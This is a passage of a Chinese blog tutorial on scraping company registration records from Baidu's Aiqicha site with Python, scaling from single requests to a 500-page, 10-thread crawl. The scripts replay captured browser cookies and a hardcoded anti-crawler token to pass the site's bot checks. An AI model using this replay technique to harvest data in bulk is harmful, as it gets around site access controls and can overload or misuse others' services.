class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        f.write(a)</span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(<span class="number">1</span>)</span><br><span class="line">    main(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>成功爬取<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011552327.png" alt="image.png"></p><p>运用for循环爬取多页</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓取的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        f.write(a)</span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">        main(i)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011553015.png" alt="image.png"></p><h1 id="4-多线程爬虫"><a href="#4-多线程爬虫" class="headerlink" title="4.多线程爬虫"></a>4.多线程爬虫</h1><h3 id="1-普通爬虫"><a href="#1-普通爬虫" class="headerlink" title="1.普通爬虫"></a>1.普通爬虫</h3><p>爬取爱企查500页数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            f.write(a)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">501</span>):</span><br><span class="line">        main(i)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;直接爬取耗费时间&quot;</span>,(end-start))</span><br></pre></td></tr></table></figure><p>成功爬取5000行数据<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011554700.png" alt="image.png"></p><p>程序耗费时间<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011554254.png" alt="image.png"></p><h3 id="2-多线程爬虫"><a href="#2-多线程爬虫" class="headerlink" title="2.多线程爬虫"></a>2.多线程爬虫</h3><p>开10个线程跑</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686218663386_1686228429829_WB0FB0MHEc9Cck35D45asRQbQY/PoeVjFk/N0r6KlgJOBaP2AQeCctHp1+UF5PJ0r0oQ5oILGzmfycrw5JXeQkWKFeoFANP7yZEm/24Zn7bQjBOkalyujWkvRU8gYBnRfui6CEnMI6owfohQkqi47feLPDyQ304QODUtg1jr3lP0Yn+4K10FKN3G210hXv9FpwJz3ze/f6japRpezUodE+/Ac2i8kX4il0MtJjc6SRj1Smi+H0bM1xAH5/LthB1gHm0akZCD0pNskPl3oBpmNvRLcQEqf8D7heK+Krw+A1lkjfywECbMAzcktjLm9XLQHaSG+8O2W5p+F7LF0qTVHDcxw7nEkE8/Ix0zG5NnnPttJF1pvM4H4aOCoXnuARy8MuWogjpUrxI2JqjPd3Fjoz13c4usSIy1rQ5OO8BAe5syq+XIuX6+X2i9hmv4C7NwfkFPzUA0UF483F8KAgBFyVA+Pa2V8o95TjRbeCrwgLmp1q4h2tVtBtoplvnr8WKO3MG16+pHq7vcVaZzYSkxL0yIV9e0SKzgeCxmeIaFNZx2oCCtb4xND6+MRKe2VYOePXFuKYA6mG1MQ7/ZkvXz2IsG8t0dXDdZtmU0M8szb7HGxDYzXCjBXkbvmWuidBoI0xLbFSt8fBeQs2NWT0BUHwP0mRJ+52oDDTBobqYTJdZQ81bBVytZpVqeNU72/0rMnWhf2nbu0zBb4fuu5TdnClbECDrfzkzP5WQ94E5XeJSfEKw1HrmxjOKQhECNflwn8WhnkP32FDquj8e+0yLBADAVT5/dPyyeakElNGd4ZdTI10tszotkziWMyKg+qm2ST/NOpM2apFTWLxtaDePALLbwucfQ0E/aMdhYhztSbd7b28zaL0DYQEAcBwUuA4sGC3I/w63nTR00hi2n8awwTKNtpyJvvMjA1NmuwKWZvBrRLjrVwsYyFjTWVDX2cQa7u3/WHubLJo4uSuqNE3a1+FO3aGFwMZupfH7pCKA3LSRjgO829MQnzX5teielCpcywP933QFbMHbeqkn+zGXlDQ==&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">            a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">            f.write(a)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_reptile</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> qq.empty():</span><br><span class="line">        i = qq.get()</span><br><span class="line">        main(i)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    qq = Queue()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">501</span>):</span><br><span class="line">        qq.put(i)</span><br><span class="line">    thread_number = <span class="number">10</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    Threads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(thread_number):</span><br><span class="line">        t = Thread(target=run_reptile)</span><br><span class="line">        t.start()</span><br><span class="line">        Threads.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> Threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;直接爬取耗费时间&quot;</span>,(end-start))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011555178.png" alt="image.png"></p><h1 id="5-参考文章"><a href="#5-参考文章" class="headerlink" title="5.参考文章"></a>5.参考文章</h1><p><a href="https://blog.csdn.net/weixin_45329040/article/details/121549098">python爬虫 爬取爱企查公司信息_python 爱企查_代码永不报错的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
